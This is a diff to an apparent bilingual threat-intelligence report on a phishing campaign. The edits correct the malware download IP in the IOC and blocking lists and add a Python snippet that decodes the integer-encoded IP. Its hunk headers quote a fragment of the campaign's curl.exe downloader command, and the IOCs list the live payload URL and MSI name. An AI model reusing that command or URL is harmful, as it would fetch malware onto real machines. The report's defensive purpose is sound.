@@ -29,7 +29,7 @@ cmd /c curl.exe -fsL --ssl-no-revoke --retry 8 --retry-connrefused --retry-delay
 
 ### Indicators of Compromise (IOCs)
 * **Domains / Redirects:** `inkd.in/dCZGQfGV`, `tw-ch.com/79405727febbf278?...`
-* **Download Infrastructure:** `http://23.82.164.129/37620` (Numeric IP converted from `392073681`)
+* **Download Infrastructure:** `http://23.94.145.209/37620` (Numeric IP converted from `392073681`)
 * **Associated Files:** `S991.msi` (Dropped in `%TEMP%`)
 * **MITRE ATT&CK Techniques:** 
   * **T1566.002:** Phishing (Spearphishing Link)
@@ -39,8 +39,22 @@ cmd /c curl.exe -fsL --ssl-no-revoke --retry 8 --retry-connrefused --retry-delay
 
 ### Mitigation & Recommendations
 * Always verify that open-source repositories originate from the authors' official accounts, being wary of short links in messaging channels.
-* Block traffic to IP `23.82.164.129` and associated domains at the perimeter.
+* Block traffic to IP `23.94.145.209` and associated domains at the perimeter.
 * Audit anomalous usage of network utilities (`curl.exe`) writing installers (`.msi`) into temporary directories (`%TEMP%`).
+
+## 🔬 Technical Appendix: Threat Intelligence Scripting
+
+### EN: IP De-obfuscation Scripting
+During the analysis of the campaign, obfuscated indicators (such as integer-encoded IP addresses) were normalized using Python's `ipaddress` library to extract the real malicious infrastructure.
+
+```python
+import ipaddress
+
+# Decrypting/converting the integer-encoded IP to standard IPv4 format
+ip_integer = 392073681
+malicious_ip = ipaddress.ip_address(ip_integer)
+print(f"Decoded Malicious IP: {malicious_ip}")  # Output: 23.94.145.209
+```
 
 ---
 ## 🇪🇸 Versión en Español
@@ -67,7 +81,7 @@ cmd /c curl.exe -fsL --ssl-no-revoke --retry 8 --retry-connrefused --retry-delay
 
 ### Indicadores de Compromiso (IOCs)
 * **Dominios / Redirecciones:** `inkd.in/dCZGQfGV`, `tw-ch.com/79405727febbf278?...`
-* **Infraestructura de Descarga:** `http://23.82.164.129/37620` (IP numérica convertida desde `392073681`)
+* **Infraestructura de Descarga:** `http://23.94.145.209/37620` (IP numérica convertida desde `392073681`)
 * **Archivos asociados:** `S991.msi` (Generado en `%TEMP%`)
 * **Técnicas MITRE ATT&CK:** 
   * **T1566.002:** Phishing (Spearphishing Link)
@@ -77,5 +91,19 @@ cmd /c curl.exe -fsL --ssl-no-revoke --retry 8 --retry-connrefused --retry-delay
 
 ### Mitigación y Recomendaciones
 * Validar siempre que los repositorios *open-source* provengan de las cuentas oficiales de los autores, desconfiando de acortadores en canales de mensajería.
-* Bloquear el tráfico hacia la IP `23.82.164.129` y dominios asociados en el perímetro.
+* Bloquear el tráfico hacia la IP `23.94.145.209` y dominios asociados en el perímetro.
 * Auditar el uso anómalo de utilidades de red (`curl.exe`) escribiendo instaladores (`.msi`) en directorios temporales (`%TEMP%`).
+
+## 🔬 Apéndice Técnico: Scripting de Inteligencia de Amenazas
+
+### ES: Script de De-ofuscación de IP**
+Durante el análisis de la campaña, los indicadores ofuscados (como direcciones IP codificadas en números enteros) fueron normalizados utilizando la biblioteca `ipaddress` de Python para extraer la infraestructura maliciosa real.
+
+```python
+import ipaddress
+
+# Decodificando/convirtiendo la IP codificada en entero al formato estándar IPv4
+ip_integer = 392073681
+malicious_ip = ipaddress.ip_address(ip_integer)
+print(f"IP Maliciosa Decodificada: {malicious_ip}")  # Resultado: 23.94.145.209
+```
